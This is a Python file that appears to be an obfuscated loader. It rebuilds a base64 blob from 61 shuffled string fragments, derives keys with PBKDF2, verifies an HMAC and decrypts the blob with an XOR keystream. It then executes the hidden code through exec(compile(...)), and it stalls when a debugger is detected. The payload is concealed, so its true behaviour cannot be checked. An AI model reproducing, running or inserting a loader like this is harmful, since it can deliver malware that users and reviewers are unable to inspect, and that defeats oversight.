import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_0d6ea8_0 = 'CLEHJRwNOF7jia8p1cbXuB6v4s47bIHZF2JHynubG2yG67TB6Rr'
_0d6ea8_1 = 'Xo/k5edPLDc7vU0VTW4q8uITw/1ShIA8nZllNLjl'
_0d6ea8_2 = 'JiCr+9pmmnMK/Q48qi1VpDx7z1k4yLXJdmRhSI+pUKTbs6UHY+b2'
_0d6ea8_3 = '3EFL3OBO6RX8QA9jm6+jrcAYImW/5H9rAVIDnhE3+MiyycbkGGg'
_0d6ea8_4 = 'Zwvcrd5Uw4G5RyGopx9mG+vwdl1WSmI2u3nfHsId+T9zl8ET+2PkTIb'
_0d6ea8_5 = 'y0Q323aYzZSl3J0hRa03QRTJNaM3pfI9q1O3EE/Q928WowgWdhZ'
_0d6ea8_6 = 'N6ouLr4jDWncOoFkcokrAnT2QD5LMCMsblet3Nj7/TzxUPCDFn/'
_0d6ea8_7 = 'OPcFka0QoDoT5R0DECSAEZVFe8JobJcl2faKc/RHLbGJOwWko'
_0d6ea8_8 = '7JpNj5FkPs8ZTCqoPFcimoSNS0TthwEmiRn1HX/qo1/WghrtXc5LWtHy7BS'
_0d6ea8_9 = 'i1mL+J/Y9P1r1Kn7Jd/n6gq4d5e3d9qK'
_0d6ea8_10 = 'lsZZocSr4wexeFL/o+68uq3lANj+X+'
_0d6ea8_11 = 'CUInqax0NlnDzbvlXtzv2Alrw4rFKE38KvUqq+/MDI9Lz9M3qWO'
_0d6ea8_12 = 'sIKRrBUbWVf0gdJUHYySPn80mGTCjwAEpycdhpYwa/02trWumtYq8aWE'
_0d6ea8_13 = 'MfdFbdJDWAxquU613X9rjdjRQ3KAeHneBAW4ts6jK9+mCidzZ1uikmN6s5'
_0d6ea8_14 = '28vFfcDT5h0aPFx8zMcs6T'
_0d6ea8_15 = '8wErh4FwJ6m9fVOJuWE0+PauEBYQ'
_0d6ea8_16 = 'nHBfBLydgww9P/Nan9Cn3bE90Jd'
_0d6ea8_17 = 'qFd1X1Zghk+8U/HZvoz4elM5QQ'
_0d6ea8_18 = 'j0Q7NB6bRnedQLNBjZvrLW4WiUhjOB+sNxPXoXI0eeSS9x/4'
_0d6ea8_19 = '4jximoaELmZnYT2mVtLNiDs6SG4Wm6TVegwDM7wAZe38+SWrDCOhQeYPQHghSOd'
_0d6ea8_20 = '4p5BLVvm+GvRnjfU1+dsd6K+KH/TQam/UierU7lzhIy'
_0d6ea8_21 = '8jiNXwBiLyWOQip0TVl/DDTdNij0EVjTJ5bvdZisCyodQiZ8Xb'
_0d6ea8_22 = 'XcdZZ8Vppnm09E42WUSxfD8tUX'
_0d6ea8_23 = 'zbaUY65MPUtOam1s0v5JZ8pb1Xk0klX43'
_0d6ea8_24 = '9wrcp9SIb1WO68i/8fUbVmO4='
_0d6ea8_25 = '4SgPgtsIeCihhvtFotUxJkZRaxgq7R+slYTT2x+adLxtwW'
_0d6ea8_26 = 'opN4LnuhKwBTiFJwVjdcZ'
_0d6ea8_27 = '9X9ki/mGaYXmfPU6cmnSlmuPh6mo2qIMVqYiI6fNAXxg9HTm'
_0d6ea8_28 = 'iHPnuFALgmXuRl2AqwhdECjfwk7WLpyS'
_0d6ea8_29 = 'kG6mhRANwWhVN5z+II5yUeUpLF9Q28aIpiHBOSEbu7V'
_0d6ea8_30 = '4Euwcv7m5iRv5LsIwbi1xX/WrUygX6UwCXPki'
_0d6ea8_31 = 'jYvmJ1JVHYUzDC2jeOKhWGgA9RAu/Dh91qrdDuG8K18VsLiDbICNMp'
_0d6ea8_32 = '/RF2l2o2tnZ9/Ayj589SOuKyvWs4tDCxM5Y5NkAfjwHcOI78Kbn5sPgw1nE68'
_0d6ea8_33 = 'tk1m5Z8tsEEXbNsoP7bp3WxcSvQFITwTjgcJ5RL5x90xfd7/SxLqSXSbU54XMa'
_0d6ea8_34 = 'IzkB13JQplmh0uvMqebv0h7ngc7Ud8O3zYotRNV8dEQ4uoEa7Q0+UL+8'
_0d6ea8_35 = 'tTTSFdjZYaijvyEvKrVxd/J+zwURPbRh1N3tG1ciCLm'
_0d6ea8_36 = 'KaX59V8n6RZ1hzwHzSLitLe0DFl9R56ReHHbalfpJXNUQNe885'
_0d6ea8_37 = '8gyBx3P9gI+dMx9pGe56vKwBBEvD9XCi86gFurV91on9zRYLOygSlnb'
_0d6ea8_38 = 'I2C7fiDaTNZE0SGRzv1OD9LF87q3Xf6xPRX09'
_0d6ea8_39 = 'Uebz8TwJ3/J1oPSwA5vYeAtCW1CCr+WJAG13J1zD9NWvyXJ'
_0d6ea8_40 = 'AyEDWMjlBs5G7ilTvcX2BTUpPvvX'
_0d6ea8_41 = 'MszjVmEaseE4mRqhJk91Sx0rzzNgH7m6hNqZY6DEV+h'
_0d6ea8_42 = 'mmjfaBokvut51Kx1hgAQ5TEQz9btcGCpMXx4bjdvzm37YAmnaivJ'
_0d6ea8_43 = 'lx3cd7KDoe9WllLAE+yHUDPEljCXEgAFboJLswdDjnbI'
_0d6ea8_44 = 'RXTHhjluV2cv/yrwvupafK'
_0d6ea8_45 = 'Lrvt/rjqUlNcWl91fhFSdiw'
_0d6ea8_46 = 'ZVwV7HkhkcglGvfEfu6LvvAN0xXJXDO8iiq4lJ9fNudXdsZVAy2tQi3lWAPVA'
_0d6ea8_47 = '+dY2fK5S3uum2PGM1CyNAzYusDdHPb70QGhHk4'
_0d6ea8_48 = 'QlSu83KFaw8luXyDJLFI88oKbw2T9WS7fk4XhW+l'
_0d6ea8_49 = 'ncTnHdlbSg7ySGQLf5rr7'
_0d6ea8_50 = 'sqHlwdBkDOniOfm+59gPmR3hRGXj2lyf9fs+PNGG1febI3Q2GDu2qG8dwcz'
_0d6ea8_51 = '7ZMcZKV8m+n8OkCoJhhtosW'
_0d6ea8_52 = 'UT+o/+upW6oh/jHfnDIGtZ5wdYGQu9drxoFMqPBrcwWq8N+wB+1tnQnsoFAx'
_0d6ea8_53 = 'eiXQDQqt4HTEU9ADFzhoPfm1f5drJ7F0GGjvycggCYnRuw3l2LS5sol8'
_0d6ea8_54 = 'retUE6o+f/ZsLE2+oOLSR4CBGjuoQOtCkhLx8/S+9HFsgsfyNlGVXsm'
_0d6ea8_55 = 'GRrS5lfxKRg3MGG9u1bylfvisYmZjpKC7uA63tkE8IHvVRsC1Xe'
_0d6ea8_56 = 'wm9UHZapWHJElnxNi+msJb24jM/P50'
_0d6ea8_57 = 'ZxUKwfNQsxKtooA6Mm/7op8IsF2xD51'
_0d6ea8_58 = '7nduwxXyxc9ANINcR5Rci6F/uQ9aMCJA/urRM+7uJseLjIp0z9On5g+'
_0d6ea8_59 = 'cyN0xFqd5u745l/mW9SqG'
_0d6ea8_60 = 'hanlEB1ogPP8KUGE2t1FyR5qt+Em2/JXFe5YdBXqE7TXwU'
_pls = [_0d6ea8_0, _0d6ea8_1, _0d6ea8_2, _0d6ea8_3, _0d6ea8_4, _0d6ea8_5, _0d6ea8_6, _0d6ea8_7, _0d6ea8_8, _0d6ea8_9, _0d6ea8_10, _0d6ea8_11, _0d6ea8_12, _0d6ea8_13, _0d6ea8_14, _0d6ea8_15, _0d6ea8_16, _0d6ea8_17, _0d6ea8_18, _0d6ea8_19, _0d6ea8_20, _0d6ea8_21, _0d6ea8_22, _0d6ea8_23, _0d6ea8_24, _0d6ea8_25, _0d6ea8_26, _0d6ea8_27, _0d6ea8_28, _0d6ea8_29, _0d6ea8_30, _0d6ea8_31, _0d6ea8_32, _0d6ea8_33, _0d6ea8_34, _0d6ea8_35, _0d6ea8_36, _0d6ea8_37, _0d6ea8_38, _0d6ea8_39, _0d6ea8_40, _0d6ea8_41, _0d6ea8_42, _0d6ea8_43, _0d6ea8_44, _0d6ea8_45, _0d6ea8_46, _0d6ea8_47, _0d6ea8_48, _0d6ea8_49, _0d6ea8_50, _0d6ea8_51, _0d6ea8_52, _0d6ea8_53, _0d6ea8_54, _0d6ea8_55, _0d6ea8_56, _0d6ea8_57, _0d6ea8_58, _0d6ea8_59, _0d6ea8_60]
_341e74 = [(29751,27952,2),(34580,41026,2),(64431,8771,2),(48312,2939,2),(22285,52127,2),(2481,21920,2),(30694,3854,2),(19374,35309,2),(7073,51108,2),(44901,49321,2),(25935,5002,2),(30214,27835,2),(63720,56857,2),(57300,30644,2),(13191,231,2),(24209,22865,2),(0,0,0),(0,0,0)]
_7303c3 = 'GQcnVg=='
_f2855c = 'uRat4nYbYI537Nvl'
_6ca785 = '6uhytExQKrA='
_2635bd = [27, 18, 59, 25, 5, 19, 53, 8, 34, 23, 17, 31, 52, 6, 35, 47, 29, 58, 57, 14, 3, 21, 24, 9, 60, 16, 28, 40, 38, 50, 33, 51, 46, 1, 11, 54, 48, 56, 22, 7, 37, 15, 20, 2, 45, 26, 0, 39, 36, 55, 32, 10, 12, 43, 4, 41, 42, 30, 49, 44, 13]
_salt = base64.b64decode(_6ca785)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _2635bd
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_8fa8a9 = base64.b64decode(_assembled)
_99fbb1 = 32
_4e2291 = _8fa8a9[:-_99fbb1]
_99fbb1 = _8fa8a9[-_99fbb1:]
_6cd846 = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_341e74)
_hdr = base64.b64decode(_7303c3)
_nonce = base64.b64decode(_f2855c)
_km_seed = hashlib.sha256(_6cd846 + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _4e2291, hashlib.sha256).digest()
if _calc_tag != _99fbb1:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_4e2291)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_4e2291, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_299f6b'] = mmap
globals()['_b765d1'] = lambda i: globals()['_299f6b'][str(i)]
_x = globals()['_b765d1']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
